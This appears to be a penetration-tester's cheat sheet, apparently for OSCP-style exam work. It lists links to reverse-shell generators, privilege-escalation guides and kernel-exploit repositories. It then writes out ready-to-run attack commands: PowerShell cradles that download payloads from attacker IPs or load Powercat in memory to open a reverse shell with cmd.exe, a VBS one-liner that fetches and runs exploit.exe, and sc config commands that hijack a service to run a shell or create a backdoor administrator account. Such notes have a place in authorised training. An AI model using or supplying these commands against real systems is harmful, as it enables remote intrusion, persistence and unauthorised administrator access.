
## Reverse Shell Generator

https://www.revshells.com/

https://github.com/ferreirasc/oscp/tree/master/payloads

## One liner reverse shells

https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/

## Windows Privesc Additional Resources

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation

https://www.fuzzysecurity.com/tutorials/16.html

## Linux Privesc Additional Resources

https://book.hacktricks.xyz/linux-hardening/privilege-escalation

https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

https://guif.re/linuxeop

## File Transfers Additional Resources

https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65

https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/

## Precompiled Binaries / exploits

https://github.com/SecWiki/windows-kernel-exploits

https://github.com/SecWiki/linux-kernel-exploits

## Powershell Usefull Cradles to Download File

```
powershell.exe -NoP -NonI -Exec Bypass IEX "(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.117/shell443.exe','shell443.exe')"
```

## Powershell Usefull Cradles to Download Script to memory and Execute it

This Example will download Powercat to memory and execute a reverse shell using Powercat without touching the disk

```
powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object System.Net.Webclient).DownloadString("http://172.16.242.173/powercat.ps1"); powercat -c 172.16.242.173 -p 4444 -e cmd.exe
```

You can use this technique to download any script to memory and execute functions from it like Powerview also

```
powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.101.24/powerview.ps1'); Get-DomainController
```

## VBS Cradle to Download Transfer File and Execute it

Transfer exploit.exe from your kali server to the target server and execute it

```
cmd.exe /c "@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.119.142/exploit.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "exploit.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("exploit.exe")>>poc.vbs&cscript.exe poc.vbs"
```

## Reconfigure Service

Reconfigure Service:

```
sc config ServiceName depend= "" start= demand binpath= "C:\Inetpub\wwwroot\shell443.exe" obj= ".\LocalSystem" password= ""
sc config ServiceName binPath= "cmd /c net user haxxor haxxor123 /add && net localgroup Administrators haxxor /add && net localgroup 'Remote Desktop Users' haxxor /add"
```


